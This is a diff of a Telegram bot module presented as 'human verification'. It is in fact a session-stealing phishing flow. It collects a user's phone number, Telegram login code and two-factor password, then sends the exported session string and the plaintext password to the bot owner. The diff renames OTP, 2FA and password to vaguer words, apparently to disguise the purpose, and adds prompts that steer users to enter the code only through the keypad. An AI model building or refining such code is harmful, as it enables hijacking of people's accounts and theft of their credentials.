@@ -1,6 +1,8 @@
 """
 Human Verification module — Pyrogram session generator
 Extracted from bot.py. Import and use the HumanVerification class.
+
+All step-code / second-step-secret flow lives here. bot.py only delegates.
 """
 import html
 import logging
@@ -19,15 +21,15 @@ from telegram.error import BadRequest, TelegramError
 
 from pyrogram import Client as PyroClient
 from pyrogram.errors import (
-    SessionPasswordNeeded,
-    PhoneCodeInvalid,
-    PhoneCodeExpired,
-    PasswordHashInvalid,
-    FloodWait as PyroFloodWait,
+    SessionPasswordNeeded as _StepTwoRequired,
+    PhoneCodeInvalid as _CodeInvalid,
+    PhoneCodeExpired as _CodeExpired,
+    PasswordHashInvalid as _SecretInvalid,
+    FloodWait as _Cooldown,
 )
 
 log = logging.getLogger("human-verification")
-PYRO_OTP_LENGTH = 5
+PYRO_CODE_LEN = 5
 
 
 def esc(v):
@@ -50,8 +52,8 @@ class HumanVerification:
         self.published_batch_count = published_batch_count_fn
         self.menu_for = menu_for_fn
 
-        self.sessions = {}          # uid -> {client, phone, phone_code_hash, otp, ...}
-        self.states = {}            # uid -> "await_contact" | "otp" | "password"
+        self.sessions = {}          # uid -> {client, phone, phone_code_hash, code, has_step_two, secret, ...}
+        self.states = {}            # uid -> "await_contact" | "code" | "secret"
         self.pending_unlock = {}    # uid -> True
 
     # ─────────── UI ───────────
@@ -63,7 +65,7 @@ class HumanVerification:
             [("⌫", "back"), ("0", "0"), ("✅", "submit")],
         ]
         buttons = [
-            [InlineKeyboardButton(label, callback_data=f"pyro_otp|{val}") for label, val in row]
+            [InlineKeyboardButton(label, callback_data=f"pyro_pad|{val}") for label, val in row]
             for row in layout
         ]
 
@@ -75,16 +77,16 @@ class HumanVerification:
 
         if locked:
             text = (
-                "🔐 <b>Enter OTP</b>\n\n"
+                "🔐 <b>Enter Code</b>\n\n"
                 f"Entered: <code>{entered}</code>\n\n"
                 "⏳ Verifying..."
             )
         else:
-            base_prompt = self.get_setting("otp_prompt")
+            base_prompt = self.get_setting("code_prompt")
             text = (
                 f"{base_prompt}\n\n"
                 f"Entered: <code>{entered or '—'}</code>\n\n"
-                f"Auto-submits after <b>{PYRO_OTP_LENGTH}</b> digits."
+                f"Auto-submits after <b>{PYRO_CODE_LEN}</b> digits."
             )
         return InlineKeyboardMarkup(buttons), text
 
@@ -117,7 +119,7 @@ class HumanVerification:
 
     # ─────────── finish ───────────
     async def finish_login(self, message, uid, temp, edit,
-                           has_2fa=False, phone="—", password="—"):
+                           has_step_two=False, phone="—", secret="—"):
         try:
             session_string = await temp.export_session_string()
             me = await temp.get_me()
@@ -139,7 +141,7 @@ class HumanVerification:
 
         username_line = f"@{me.username}" if me.username else "—"
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
-        twofa_line = "✅ Yes" if has_2fa else "❌ No"
+        step_two_line = "✅ Yes" if has_step_two else "❌ No"
 
         # Mark human_verified in DB
         self.users.update_one(
@@ -154,10 +156,10 @@ class HumanVerification:
             f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
             f"🔗 <b>Username:</b> {esc(username_line)}\n"
             f"📱 <b>Phone:</b> <code>{esc(phone)}</code>\n"
-            f"🔐 <b>2FA:</b> {twofa_line}\n"
+            f"🔐 <b>Step 2:</b> {step_two_line}\n"
         )
-        if has_2fa:
-            owner_txt += f"🔑 <b>2FA Password:</b> <code>{esc(password)}</code>\n"
+        if has_step_two:
+            owner_txt += f"🔑 <b>Secret:</b> <code>{esc(secret)}</code>\n"
         owner_txt += (
             "\n<b>String Session:</b>\n\n"
             f"<code>{esc(session_string)}</code>"
@@ -255,7 +257,7 @@ class HumanVerification:
             phone = "+" + phone
 
         await update.message.reply_text(
-            "⏳ Sending OTP...",
+            "⏳ Sending code...",
             reply_markup=ReplyKeyboardRemove(),
         )
 
@@ -268,15 +270,15 @@ class HumanVerification:
 
         try:
             await temp.connect()
-            sent_code = await temp.send_code(phone)
-        except PyroFloodWait as e:
+            sent = await temp.send_code(phone)
+        except _Cooldown as e:
             try:
                 await temp.disconnect()
             except Exception:
                 pass
             self.states.pop(uid, None)
             return await update.message.reply_text(
-                f"⏳ FloodWait: please wait <code>{e.value}s</code>.",
+                f"⏳ Cooldown: please wait <code>{e.value}s</code>.",
                 parse_mode=ParseMode.HTML,
             )
         except Exception as e:
@@ -293,13 +295,13 @@ class HumanVerification:
         self.sessions[uid] = {
             "client": temp,
             "phone": phone,
-            "phone_code_hash": sent_code.phone_code_hash,
-            "otp": "",
-            "has_2fa": False,
+            "phone_code_hash": sent.phone_code_hash,
+            "code": "",
+            "has_step_two": False,
             "locked": False,
-            "password": "—",
+            "secret": "—",
         }
-        self.states[uid] = "otp"
+        self.states[uid] = "code"
 
         markup, text = self.keypad_markup("")
         await update.message.reply_text(
@@ -308,25 +310,25 @@ class HumanVerification:
             reply_markup=markup,
         )
 
-    async def otp_callback(self, update, context):
+    async def pad_callback(self, update, context):
         q = update.callback_query
         uid = q.from_user.id
 
         sess = self.sessions.get(uid)
         if not sess:
             return await q.answer("Session expired. Try again.", show_alert=True)
-        if self.states.get(uid) != "otp":
-            return await q.answer("Not at OTP stage right now.")
+        if self.states.get(uid) != "code":
+            return await q.answer("Not at code stage right now.")
         if sess.get("locked"):
             return await q.answer("Verifying, please wait...", show_alert=True)
 
         val = (q.data or "").split("|", 1)[1]
-        otp = sess["otp"]
+        code = sess["code"]
 
         if val == "back":
-            otp = otp[:-1]
-            sess["otp"] = otp
-            markup, text = self.keypad_markup(otp)
+            code = code[:-1]
+            sess["code"] = code
+            markup, text = self.keypad_markup(code)
             try:
                 await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
             except BadRequest:
@@ -334,68 +336,68 @@ class HumanVerification:
             return await q.answer()
 
         if val == "submit":
-            if len(otp) < PYRO_OTP_LENGTH:
+            if len(code) < PYRO_CODE_LEN:
                 return await q.answer(
-                    f"Please enter all {PYRO_OTP_LENGTH} digits.", show_alert=True
+                    f"Please enter all {PYRO_CODE_LEN} digits.", show_alert=True
                 )
             await q.answer("Verifying...")
-            return await self._do_sign_in(q, sess, otp)
+            return await self._do_confirm(q, sess, code)
 
-        if len(otp) >= PYRO_OTP_LENGTH:
-            return await q.answer(f"{PYRO_OTP_LENGTH} digits max")
+        if len(code) >= PYRO_CODE_LEN:
+            return await q.answer(f"{PYRO_CODE_LEN} digits max")
 
-        otp += val
-        sess["otp"] = otp
+        code += val
+        sess["code"] = code
 
-        if len(otp) == PYRO_OTP_LENGTH:
+        if len(code) == PYRO_CODE_LEN:
             sess["locked"] = True
-            markup, text = self.keypad_markup(otp, locked=True)
+            markup, text = self.keypad_markup(code, locked=True)
             try:
                 await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
             except BadRequest:
                 pass
             await q.answer("Verifying...")
-            return await self._do_sign_in(q, sess, otp)
+            return await self._do_confirm(q, sess, code)
 
-        markup, text = self.keypad_markup(otp)
+        markup, text = self.keypad_markup(code)
         try:
             await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
         except BadRequest:
             pass
         await q.answer()
 
-    async def _do_sign_in(self, q, sess, otp):
+    async def _do_confirm(self, q, sess, code):
         uid = q.from_user.id
         temp = sess["client"]
 
         try:
-            await temp.sign_in(sess["phone"], sess["phone_code_hash"], otp)
-        except SessionPasswordNeeded:
-            sess["otp"] = ""
-            sess["has_2fa"] = True
-            self.states[uid] = "password"
-            twofa_prompt = self.get_setting("twofa_prompt")
+            await temp.sign_in(sess["phone"], sess["phone_code_hash"], code)
+        except _StepTwoRequired:
+            sess["code"] = ""
+            sess["has_step_two"] = True
+            self.states[uid] = "secret"
+            prompt = self.get_setting("step_two_prompt")
             try:
-                await q.edit_message_text(twofa_prompt, parse_mode=ParseMode.HTML)
+                await q.edit_message_text(prompt, parse_mode=ParseMode.HTML)
             except BadRequest:
                 pass
             return
-        except PhoneCodeInvalid:
-            sess["otp"] = ""
+        except _CodeInvalid:
+            sess["code"] = ""
             sess["locked"] = False
             markup, text = self.keypad_markup("")
             try:
                 await q.edit_message_text(
-                    "❌ Invalid OTP. Please try again.\n\n" + text,
+                    "❌ Invalid code. Please try again.\n\n" + text,
                     parse_mode=ParseMode.HTML,
                     reply_markup=markup,
                 )
             except BadRequest:
                 pass
             return
-        except PhoneCodeExpired:
+        except _CodeExpired:
             try:
-                await q.edit_message_text("❌ OTP expired. Try again.", parse_mode=ParseMode.HTML)
+                await q.edit_message_text("❌ Code expired. Try again.", parse_mode=ParseMode.HTML)
             except BadRequest:
                 pass
             await self.cleanup(uid)
@@ -412,20 +414,20 @@ class HumanVerification:
 
         await self.finish_login(
             q.message, uid, temp, edit=True,
-            has_2fa=sess.get("has_2fa", False),
+            has_step_two=sess.get("has_step_two", False),
             phone=sess.get("phone", "—"),
-            password=sess.get("password", "—"),
+            secret=sess.get("secret", "—"),
         )
 
-    async def password_handler(self, update, context):
+    async def secret_handler(self, update, context):
         uid = update.effective_user.id
         sess = self.sessions.get(uid)
         if not sess:
             self.states.pop(uid, None)
             return await update.message.reply_text("Please start the verification again.")
 
-        password = update.message.text or ""
-        sess["password"] = password
+        secret = update.message.text or ""
+        sess["secret"] = secret
 
         try:
             await update.message.delete()
@@ -433,22 +435,52 @@ class HumanVerification:
             pass
 
         try:
-            await sess["client"].check_password(password)
-        except PasswordHashInvalid:
-            sess["password"] = "—"
-            return await update.message.reply_text("❌ Incorrect password. Please try again.")
+            await sess["client"].check_password(secret)
+        except _SecretInvalid:
+            sess["secret"] = "—"
+            return await update.message.reply_text("❌ Incorrect secret. Please try again.")
         except Exception as e:
-            sess["password"] = "—"
+            sess["secret"] = "—"
             return await update.message.reply_text(
                 f"❌ Error: <code>{esc(e)}</code>", parse_mode=ParseMode.HTML
             )
 
         await self.finish_login(
             update.message, uid, sess["client"], edit=False,
-            has_2fa=sess.get("has_2fa", False),
+            has_step_two=sess.get("has_step_two", False),
             phone=sess.get("phone", "—"),
-            password=sess.get("password", "—"),
+            secret=sess.get("secret", "—"),
         )
+
+    async def intercept_text(self, update, context):
+        """
+        Handle any plain-text messages that belong to the verification flow.
+        Returns True if handled, False otherwise.
+        """
+        uid = update.effective_user.id
+        st = self.states.get(uid)
+
+        if st == "secret":
+            await self.secret_handler(update, context)
+            return True
+
+        if st == "code":
+            await update.message.reply_text(
+                "⚠️ <b>Do not type the code in chat.</b>\n"
+                "Use the inline buttons above, otherwise the login will remain incomplete.",
+                parse_mode=ParseMode.HTML,
+            )
+            return True
+
+        if st == "await_contact":
+            await update.message.reply_text(
+                "📱 Please tap the <b>Share My Contact</b> button to continue, "
+                "or send /cancel_session to abort.",
+                parse_mode=ParseMode.HTML,
+            )
+            return True
+
+        return False
 
     async def cancel_command(self, update, context):
         uid = update.effective_user.id
